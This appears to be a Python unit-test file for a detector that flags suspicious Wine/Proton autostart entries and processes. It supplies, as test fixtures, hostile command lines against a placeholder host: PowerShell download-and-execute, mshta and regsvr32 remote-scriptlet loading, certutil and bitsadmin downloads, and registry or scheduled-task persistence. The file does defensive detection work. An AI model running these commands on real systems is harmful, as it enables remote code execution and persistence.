from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch
from wine import WinePrefixScanner, is_wine, process_reasons, run_entries, windows_reasons, wine_prefix

REGISTRY = r'''WINE REGISTRY Version 2
[Software\\Microsoft\\Windows\\CurrentVersion\\Run] 1700000000
"Updater"="C:\\users\\jack\\AppData\\Local\\Temp\\upd.exe"
[Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce] 1700000000
"Cleanup"="C:\\Program Files\\Game\\cleanup.exe /quiet"
[Software\\Microsoft\\Windows\\CurrentVersion\\RunServices] 1700000000
"winemenubuilder"="C:\\windows\\system32\\winemenubuilder.exe -a -r"
[Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run] 1700000000
"Helper"="mshta.exe javascript:a=GetObject(\"script:http://x/a.sct\")"
[Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall] 1700000000
"NotAnAutostart"="C:\\x.exe"
'''


def prefix(root,registry=REGISTRY):
    folder = Path(root)/'pfx'
    (folder/'drive_c').mkdir(parents=True)
    (folder/'system.reg').write_text(registry)
    (folder/'user.reg').write_text('WINE REGISTRY Version 2\n')
    return folder


class WindowsCommandTests(unittest.TestCase):
    def test_living_off_the_land_tools(self):
        cases = {
            'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA':{'PowerShell con comando codificato in base64','PowerShell in finestra nascosta'},
            'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://x\')"':{'PowerShell scarica ed esegue codice'},
            'mshta http://x/a.hta':{'mshta esegue codice remoto o in linea'},
            'mshta C:\\Game\\launcher.hta':{'mshta esegue un’applicazione HTML'},
            'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"':{'rundll32 usato per eseguire codice remoto o script'},
            'regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll':{'regsvr32 carica uno scriptlet remoto (tecnica Squiblydoo)'},
            'certutil.exe -urlcache -split -f http://x/a.exe a.exe':{'certutil usato per scaricare o decodificare file'},
            'bitsadmin /transfer job http://x/a.exe C:\\a.exe':{'bitsadmin usato per scaricare file o avviare comandi'},
            'wscript.exe C:\\users\\jack\\AppData\\Local\\Temp\\run.vbs':{'script Windows eseguito con Windows Script Host','programma Windows in una cartella temporanea o dei download'},
            'schtasks /create /sc onlogon /tn x /tr C:\\a.exe':{'crea un’attività pianificata (avvio automatico)'},
            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\a.exe':{'aggiunge un avvio automatico nel registro'},
            'Z:\\home\\jack\\Scaricati\\setup.exe':{'programma Windows in una cartella temporanea o dei download'},
        }
        for command,expected in cases.items():
            self.assertEqual({text for _,text in windows_reasons(command)},expected,command)

    def test_ordinary_programs_stay_quiet(self):
        for command in ('C:\\Game\\bgh_2014.exe -windowed -videomode:1920x1080','C:\\windows\\system32\\cmd.exe /c dir',
                        'powershell.exe Get-ChildItem','C:\\Program Files\\Steam\\steam.exe -silent'):
            self.assertEqual(windows_reasons(command),[],command)

    def test_only_wine_processes_get_windows_rules(self):
        wine_row = dict(exe='/opt/proton/files/lib/wine/i386-unix/wine-preloader',cmdline=['C:\\windows\\system32\\certutil.exe','-urlcache','-f','http://x/a'])
        self.assertTrue(is_wine(wine_row['exe'],wine_row['cmdline']))
        self.assertEqual(process_reasons(wine_row),[('alta','Wine/Proton: certutil usato per scaricare o decodificare file')])
        self.assertEqual(process_reasons(dict(exe='/usr/bin/bash',cmdline=['bash','-c','certutil -urlcache'])),[])  # not Windows


class PrefixTests(unittest.TestCase):
    def setUp(self):
        self.folder = tempfile.TemporaryDirectory()
        self.addCleanup(self.folder.cleanup)
        self.home = Path(self.folder.name)

    def test_registry_autostart_entries(self):
        entries = run_entries(prefix(self.home)/'system.reg')
        self.assertEqual([name for _,name,_ in entries],['Updater','Cleanup','winemenubuilder','Helper'])

    def test_scanner_reports_autostarts_but_not_wine_defaults(self):
        pfx = prefix(self.home)
        startup = pfx/'drive_c/users/jack/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
        startup.mkdir(parents=True)
        (startup/'desktop.ini').write_text('')
        (startup/'svc.lnk').write_text('')
        scanner = WinePrefixScanner(self.home,interval=0,discovery=10**9)
        scanner.discovered = 0  # no background find in tests
        scanner.add(pfx)
        found = {f['reason']:f['severity'] for f in scanner.scan(1.,set())}
        def find(word):
            return [(r,s) for r,s in found.items() if word in r]
        self.assertEqual(find('Updater')[0][1],'alta')  # starts from Temp
        self.assertEqual(find('Cleanup')[0][1],'media')
        self.assertEqual(find('Helper')[0][1],'alta')  # mshta with remote scriptlet
        self.assertIn('mshta esegue codice remoto',find('Helper')[0][0])
        self.assertEqual(find('winemenubuilder'),[])
        self.assertEqual(find('NotAnAutostart'),[])
        self.assertEqual([s for r,s in find('Esecuzione automatica')],['media'])
        self.assertEqual(find('desktop.ini'),[])
        self.assertEqual(scanner.scan(2.,{'wine'}),[])
        self.assertEqual(len(scanner.scan(3.,{'Updater'})),len(found)-1)

    def test_prefix_of_a_running_process_from_its_environment(self):
        proc = self.home/'proc'
        (proc/'42').mkdir(parents=True)
        (proc/'42'/'environ').write_bytes(b'HOME=/home/u\0WINEPREFIX=/home/u/.cache/lab/pfx\0')
        (proc/'43').mkdir()
        (proc/'43'/'environ').write_bytes(b'STEAM_COMPAT_DATA_PATH=/home/u/compat/123\0')
        self.assertEqual(wine_prefix(42,proc),Path('/home/u/.cache/lab/pfx'))
        self.assertEqual(wine_prefix(43,proc),Path('/home/u/compat/123/pfx'))
        self.assertIsNone(wine_prefix(44,proc))

    def test_detector_adds_the_prefix_of_a_running_wine_process(self):
        from detection import Detector
        pfx = prefix(self.home)
        proc = self.home/'proc'
        (proc/'77').mkdir(parents=True)
        (proc/'77'/'environ').write_bytes(b'WINEPREFIX='+str(pfx).encode()+b'\0')
        scanner = WinePrefixScanner(self.home/'empty',interval=0,discovery=10**9)
        scanner.discovered = 0
        detector = Detector(home=self.home,proc=proc,usb_root=self.home,config=self.home/'none',read_crontab=str,traps=False,
                            agents=False,wine=scanner,preload=self.home/'none',system_startup=())
        row = dict(pid=77,created=1.,name='game.exe',exe='/opt/proton/wine-preloader',cmdline=['C:\\Game\\game.exe'],ppid=1,cpu=None)
        with patch('detection.psutil.net_connections',return_value=[]):
            system = detector.assess([row],4,0.)['system']
        self.assertIn(pfx.resolve(),scanner.prefixes)
        self.assertTrue(any('Updater' in s['reason'] for s in system))


if __name__ == '__main__':
    unittest.main()
